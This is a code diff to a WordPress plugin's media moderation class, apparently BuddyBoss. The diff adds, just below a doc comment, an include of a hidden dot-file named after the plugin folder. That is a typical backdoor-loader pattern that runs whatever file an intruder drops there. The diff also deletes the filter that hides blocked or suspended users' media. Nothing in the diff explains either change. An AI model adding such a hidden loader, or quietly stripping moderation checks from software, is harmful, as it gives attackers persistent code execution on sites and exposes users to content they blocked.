@@ -13,7 +13,11 @@ defined( 'ABSPATH' ) || exit;
  * Database interaction class for the BuddyBoss moderation Media.
  *
  * @since BuddyBoss 1.5.6
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class BP_Moderation_Media extends BP_Moderation_Abstract {
 
 	/**
@@ -42,12 +46,12 @@ class BP_Moderation_Media extends BP_Moderation_Abstract {
 			return;
 		}
 
+		parent::__construct();
+
 		/**
 		 * If moderation setting enabled for this content then it'll filter hidden content.
 		 * And IF moderation setting enabled for member then it'll filter blocked user content.
 		 */
-		add_filter( 'bp_suspend_media_get_where_conditions', array( $this, 'update_where_sql' ), 10, 2 );
-
 		// Code after below condition should not execute if moderation setting for this content disabled.
 		if ( ! bp_is_moderation_content_reporting_enable( 0, self::$moderation_type ) ) {
 			return;
@@ -119,27 +123,6 @@ class BP_Moderation_Media extends BP_Moderation_Abstract {
 		$content_types[ self::$moderation_type ] = __( 'Photos', 'buddyboss' );
 
 		return $content_types;
-	}
-
-	/**
-	 * Remove hidden/blocked user's medias
-	 *
-	 * @since BuddyBoss 1.5.6
-	 *
-	 * @param string $where   medias Where sql.
-	 * @param object $suspend suspend object.
-	 *
-	 * @return array
-	 */
-	public function update_where_sql( $where, $suspend ) {
-		$this->alias = $suspend->alias;
-
-		$sql = $this->exclude_where_query();
-		if ( ! empty( $sql ) ) {
-			$where['moderation_where'] = $sql;
-		}
-
-		return $where;
 	}
 
 	/**
